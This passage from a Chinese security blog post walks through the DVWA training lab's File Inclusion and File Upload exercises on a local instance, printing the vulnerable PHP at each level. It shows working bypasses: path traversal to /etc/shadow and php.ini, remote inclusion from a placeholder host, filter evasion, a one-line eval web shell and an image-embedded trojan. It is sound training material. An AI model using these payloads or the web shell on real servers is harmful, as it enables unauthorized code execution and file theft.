+<h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码很少，就一行，没有对参数进行任何的处理，点击下面的三个链接，可以看到url中的变化</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uhnmmd.png" alt="uhnmmd.png"></p>
+<p>尝试读取shadow文件<a target="_blank" rel="noopener" href="http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=/etc/shadow">http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uhnJXQ.png" alt="uhnJXQ.png"></p>
+<p>可以看到报错信息，可见不是Linux系统，而是Windows系统，同时也可以看到一个绝对路径<code>F:\phpstudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php</code></p>
+<p>尝试读取文件<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=F:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></p>
+<p>上面使用的是绝对路径，也可以使用相对路径，<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=..\..\php.ini</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uhuXqJ.png" alt="uhuXqJ.png"></p>
+<p>能够读取到php.ini配置文件，</p>
+<p>远程文件包含</p>
+<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态On时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<p>假如，一个地址为x.x.x.x的服务器上包含一个phpinfo.txt文件，内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么就可以通过访问<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=http://x.x.x.x/phpinfo.txt</code>，来执行phpinfo()函数</p>
+<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>medium的代码中对一些字符进行了过滤，”http://“，”https://“</p>
+<p>，”../“, “..\“，</p>
+<p>这里过滤了..\，<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=..\..\php.ini</code>应该是无法读取文件的，但是这里依然可以读取，有点懵</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uh8RfA.png" alt="uh8RfA.png"></p>
+<p>这里使用绝对路径是完全没问题的</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uhGitJ.png" alt="uhGitJ.png"></p>
+<p>这里过滤了<code>http://</code>和<code>https://</code>，但是str_replace有很大的安全问题，可以使用大小写或者双写绕过这个检测，所以，远程文件包含，<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=htthttp://p://x.x.x.x/phpinfo.txt</code>或者<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=HTtp://x.x.x.x/phpinfo.txt</code>来实现远程文件包含。</p>
+<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">	<span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_filesystem_fnmatch.asp">fnmatch</a></p>
+<p>看似安全，但是可以利用file协议来读取文件</p>
+<p><code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file://F:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uhN4Z6.png" alt="uhN4Z6.png"></p>
+<h3 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h3><p> 即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。 </p>
+<h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	<span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">	<span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">	<span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// No</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Yes!</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> basename() 函数返回路径中的文件名部分。 </p>
+</blockquote>
+<p> 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 </p>
+<p>所以，直接上传一个php马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/11/03/KXaYnO.png" alt="KXaYnO.png"></p>
+<p>上传成功并且返回了文件路径，</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KXdA5d.png" alt="KXdA5d.png"></p>
+<p>尝试访问，是一个空白界面，但是确实是有这个界面的。</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KXd9KK.png" alt="KXd9KK.png"></p>
+<p>上菜刀</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KX0dN4.png" alt="KX0dN4.png"></p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KX0RED.png" alt="KX0RED.png"></p>
+<p>成功拿到shell</p>
+<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	<span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">	<span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	<span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">	<span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">	<span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">		( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> medium代码中要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB） </p>
+<p>用burpsuite抓包更改一下文件类型即可。（也可以上传一个shell.jpg，然后抓包修改为shell.php）</p>
+<p> 在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KXrcD0.png" alt="KXrcD0.png"></p>
+<p>成功上传，再次使用菜刀连接即可。</p>
+<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	<span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">	<span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	<span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">	<span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">	<span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">	<span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> substr() 函数返回字符串的一部分。 </p>
+<p> strrpos() 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     //找到“php”第一次出现的位置</span><br><span class="line">echo strrpos(&quot;I love php, I love php too!&quot;,&quot;php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> strtolower将字符串中所有的字母字符转换为小写并返回。 </p>
+<p> getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 </p>
+<p>high的代码相当于一个白名单，只允许上传.jpg、.png、.jpeg后缀文件，文件大小小于100000。</p>
+<p>所以，我们需要制作一个图片马，制作方法如下：</p>
+<p>首先，找一个正常的图片test.jpg，然后再加上上面那样的php一句话木马，在cmd输入<code>copy test.jpg/b + shell.php/a picshell.jpg</code></p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KjlJN6.png" alt="KjlJN6.png"></p>
+<p>得到的picshell.jpg文件中</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KjlsEt.png" alt="KjlsEt.png"></p>
+<p>可以看到木马已经写进来了，可以上传了。</p>
+<p><img src="https://s2.ax1x.com/2019/11/03/KjJQTs.png" alt="KjJQTs.png"></p>
+<p>直接上菜刀的话是不行的，因为这个文件不会被当成php来解析。所以这里要使用文件包含，文件包含有个漏洞，就是它不会识别是不是php文件，只要你使用了文件包含，它都会来当成php来解析，所以图片马就可被解析。</p>
+<p> <code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file:///F:/phpstudy/PHPTutorial/WWW/DVWA/hackable/uploads/picshell.jpg </code></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/ctf/">ctf</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/DVWA/">DVWA</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2019/10/03/%E9%9D%B6%E5%9C%BA/DVWA%E7%BB%83%E4%B9%A0/" data-title="DVWA练习 | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/10/14/大学CTF/不知列名SQL注入/" title="不知列名SQL注入">
+  <strong>上一篇：</strong><br/>
+  <span>
+  不知列名SQL注入</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/09/30/靶场/xsslabs通关/"  title="xsslabs通关">
+ <strong>下一篇：</strong><br/> 
+ <span>xsslabs通关
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Alow"><span class="toc-number">2.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Amedium"><span class="toc-number">2.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Ahigh"><span class="toc-number">2.3.</span> <span class="toc-text">DVWA Security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Alow-1"><span class="toc-number">3.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Amedium-1"><span class="toc-number">3.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Ahigh-1"><span class="toc-number">3.3.</span> <span class="toc-text">DVWA Security：high</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Aimpossible"><span class="toc-number">3.4.</span> <span class="toc-text">DVWA Security：impossible</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Cross-site-request-forgery"><span class="toc-number">4.</span> <span class="toc-text">CSRF(Cross-site request forgery)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security-low"><span class="toc-number">4.1.</span> <span class="toc-text">DVWA security:low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security%EF%BC%9Amedium"><span class="toc-number">4.2.</span> <span class="toc-text">DVWA security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security%EF%BC%9Ahigh"><span class="toc-number">4.3.</span> <span class="toc-text">DVWA security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">5.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low"><span class="toc-number">5.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium"><span class="toc-number">5.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high"><span class="toc-number">5.3.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-upload"><span class="toc-number">6.</span> <span class="toc-text">file upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-1"><span class="toc-number">6.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium-1"><span class="toc-number">6.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-1"><span class="toc-number">6.3.</span> <span class="toc-text">high</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
